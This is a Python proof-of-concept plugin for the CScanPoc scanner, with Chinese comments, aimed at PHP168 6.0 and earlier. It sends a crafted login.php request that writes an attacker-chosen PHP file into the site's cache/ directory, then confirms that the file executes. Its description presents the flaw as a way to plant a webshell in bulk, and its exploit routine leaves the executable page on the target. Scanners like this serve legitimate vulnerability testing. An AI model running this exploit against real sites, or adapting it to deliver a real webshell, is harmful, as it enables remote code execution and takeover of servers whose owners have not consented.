# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import random


class Vuln(ABVuln):
    vuln_id = 'PHP168_0001'  # 平台漏洞编号，留空
    name = 'PHP168 6.0及以下版本login.php存在逻辑错误'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.OTHER  # 漏洞类型
    disclosure_date = '2014-02-10'  # 漏洞公布时间
    desc = '''
        PHP168整站是PHP的建站系统，代码全部开源，是国内知名的开源软件提供商；提供核心+模块+插件的模式；任何应用均可在线体验。
        利用代码将php木马插入到cache/目录里轻松获得webshell，可批量。
    '''  # 漏洞描述
    ref = 'Unknown'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'PHP168'  # 漏洞应用名称
    product_version = '6.0及以下版本'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = 'ad705416-7fc3-46f0-9c70-59be692eab92'
    author = '47bwy'  # POC编写者
    create_date = '2018-05-07'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            # 生成随机页面
            randstr = '404_'+str(random.randint(1, 10000))
            # print(randstr)
            payload = '/login.php?makehtml=1&chdb[htmlname]={num}.php&chdb[path]=cache&content=<?php%20echo%20md5(1);?>'.format(
                num=randstr)
            requests.get(self.target + payload)
            verify_url = self.target + '/cache/{num}.php'.format(num=randstr)
            r = requests.get(verify_url)

            if r.status_code == 200 and 'c4ca4238a0b923820dcc509a6f75849b' in r.text:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            # 生成随机页面
            randstr = '404_'+str(random.randint(1, 10000))
            payload = '/login.php?makehtml=1&chdb[htmlname]={num}.php&chdb[path]=cache&content=<?php%20echo%20md5(1);?>'.format(
                num=randstr)
            requests.get(self.target + payload)
            verify_url = self.target + '/cache/{num}.php'.format(num=randstr)
            r = requests.get(verify_url)

            if r.status_code == 200 and 'c4ca4238a0b923820dcc509a6f75849b' in r.text:
                self.output.report(self.vuln, '发现{target}存在{vulnname}漏洞，已在cache目录下上传可执行代码页面：{verify_url}'.format(
                    target=self.target, vulnname=self.vuln.name, verify_url=verify_url))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))


if __name__ == '__main__':
    Poc().run()
